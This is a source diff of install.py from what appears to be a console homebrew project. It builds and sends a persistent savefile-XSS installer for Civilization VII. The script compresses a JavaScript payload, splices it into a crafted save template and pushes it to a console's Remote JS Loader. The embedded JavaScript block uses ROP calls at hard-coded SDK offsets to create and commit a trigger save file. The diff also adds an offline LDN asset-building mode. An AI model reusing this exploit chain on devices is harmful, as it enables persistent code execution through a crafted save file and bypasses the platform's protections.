@@ -4,11 +4,14 @@
 # Source: https://github.com/Gezine/CivSwitch/blob/3238a3e3340fd19a9dbd5cde56f3b50f9bc5d97f/installer-creator/install.py
 """install.py - one-shot CIV7 savefile-XSS installer.
 
-Builds the installer in a temp directory and sends it to the console's
-Remote JS Loader automatically: compresses the payload, splices it into
-the bundled save template, uploads the template as chunked connections,
-then writes the persistent XSTRIG.Civ7Save trigger (cleaning up any
-previously installed trigger files first).
+Builds the installer in a temporary directory, compresses the payload,
+splices it into the bundled save template and writes the persistent
+XSTRIG.Civ7Save trigger (cleaning up any previously installed trigger files
+first). It can prepare assets for the UDP/LDN transfer or send the installer
+through an already-running TCP Remote JS Loader.
+
+The LDN launcher can build offline transfer assets with:
+  python install.py --build-ldn-assets <output-dir> [payload.js]
 
 Usage:
   python install.py <console-ip> [port] [payload.js]
@@ -39,7 +42,7 @@ BLOCK = r"""
 (async function() {
 try {
 
-// ==== savefile-XSS installer (template uploaded from PC) ====
+// ==== savefile-XSS installer (template transferred over LDN or TCP) ====
 const F_CreateFile  = sdk_base + 0xa6700n;
 const F_OpenFile    = sdk_base + 0xa78a0n;
 const F_CloseFile   = sdk_base + 0xa5a70n;
@@ -178,6 +181,7 @@ if (r4 !== 0n) { await log("E: write " + toHex(r4)); return; }
 sfx_writePath(text_encode("save"));
 const cr = call_rop(F_Commit, sfx_pb);
 if (cr !== 0n) { await log("E: commit " + toHex(cr)); return; }
+window.__civswitchPersistOK = true;
 await log("INSTALL DONE - reboot, Load Game");
 
 } catch (e) {
@@ -206,7 +210,62 @@ def send(host, port, code, timeout=300):
     return data.decode("utf-8", "replace")
 
 
+def load_template():
+    tpl = open(os.path.join(HERE, "save_template.bin"), "rb").read()
+    if len(tpl) < 4096 or tpl[:4] != b"CIV7":
+        raise ValueError("bad save_template.bin")
+    return base64.b64encode(tpl).decode()
+
+
+def build_apply_js(payload_path, tpl_b64, tmp):
+    core = io.open(payload_path, encoding="utf-8").read().replace("\r\n", "\n")
+    wrapped = ("(async function() {\ntry{\n" + core +
+               "\n} catch (e) {\nawait log('EXCEPTION: ' + e.message);\nawait log(e.stack);\n}\n})();")
+    wrapped_path = os.path.join(tmp, "wrapped.js")
+    io.open(wrapped_path, "w", encoding="utf-8", newline="\n").write(wrapped)
+    hex_path = os.path.join(tmp, "stage.hex")
+    r = subprocess.run(["node", os.path.join(HERE, "compress_stage.js"),
+                        wrapped_path, hex_path],
+                       capture_output=True, text=True)
+    print(r.stdout.strip())
+    if r.returncode != 0:
+        raise RuntimeError(r.stderr.strip() or "Could not compress the persistent payload")
+    stage_hex = io.open(hex_path, encoding="utf-8").read().strip()
+    return (BLOCK
+            .replace("__STAGER__", json.dumps(STAGER))
+            .replace("__STAGE_HEX__", json.dumps(stage_hex))
+            .replace("__TPL_B64_LEN__", str(len(tpl_b64))))
+
+
+def build_ldn_assets(output_dir, payload_path):
+    os.makedirs(output_dir, exist_ok=True)
+    tmp = tempfile.mkdtemp(prefix="civ7inst_ldn_")
+    try:
+        tpl_b64 = load_template()
+        apply_js = build_apply_js(payload_path, tpl_b64, tmp)
+        tpl_path = os.path.join(output_dir, "template.b64")
+        js_path = os.path.join(output_dir, "apply.b64")
+        open(tpl_path, "wb").write(tpl_b64.encode("ascii"))
+        open(js_path, "wb").write(base64.b64encode(apply_js.encode("ascii")))
+        print("LDN installer assets ready: template %d bytes, apply %d bytes" %
+              (len(tpl_b64), os.path.getsize(js_path)))
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
+
+
 def main():
+    if len(sys.argv) > 1 and sys.argv[1] == "--build-ldn-assets":
+        if len(sys.argv) not in (3, 4):
+            print("Usage: install.py --build-ldn-assets <output-dir> [payload.js]", file=sys.stderr)
+            sys.exit(1)
+        payload_path = sys.argv[3] if len(sys.argv) == 4 else os.path.join(HERE, "..", "payloads", "core.js")
+        try:
+            build_ldn_assets(sys.argv[2], payload_path)
+        except Exception as e:
+            print("Could not build LDN installer assets: " + str(e), file=sys.stderr)
+            sys.exit(2)
+        return
+
     if len(sys.argv) < 2:
         print(__doc__)
         sys.exit(1)
@@ -216,32 +275,9 @@ def main():
 
     tmp = tempfile.mkdtemp(prefix="civ7inst_")
     try:
-        # 1. wrap + compress the payload (offline round-trip check)
-        core = io.open(payload_path, encoding="utf-8").read().replace("\r\n", "\n")
-        wrapped = ("(async function() {\ntry{\n" + core +
-                   "\n} catch (e) {\nawait log('EXCEPTION: ' + e.message);\nawait log(e.stack);\n}\n})();")
-        wrapped_path = os.path.join(tmp, "wrapped.js")
-        io.open(wrapped_path, "w", encoding="utf-8", newline="\n").write(wrapped)
-        hex_path = os.path.join(tmp, "stage.hex")
-        r = subprocess.run(["node", os.path.join(HERE, "compress_stage.js"),
-                            wrapped_path, hex_path],
-                           capture_output=True, text=True)
-        print(r.stdout.strip())
-        if r.returncode != 0:
-            print(r.stderr)
-            sys.exit(2)
-        stage_hex = io.open(hex_path, encoding="utf-8").read().strip()
-
-        # 2. template + apply payload
-        tpl = open(os.path.join(HERE, "save_template.bin"), "rb").read()
-        if len(tpl) < 4096 or tpl[:4] != b"CIV7":
-            print("E: bad save_template.bin")
-            sys.exit(3)
-        tpl_b64 = base64.b64encode(tpl).decode()
-        apply_js = (BLOCK
-                    .replace("__STAGER__", json.dumps(STAGER))
-                    .replace("__STAGE_HEX__", json.dumps(stage_hex))
-                    .replace("__TPL_B64_LEN__", str(len(tpl_b64))))
+        # 1. template and apply payload
+        tpl_b64 = load_template()
+        apply_js = build_apply_js(payload_path, tpl_b64, tmp)
 
         # 3. upload template chunks, then apply
         print(send(host, port, "log('STARTING INSTALLER');window.__tpl=null;'reset'").strip())
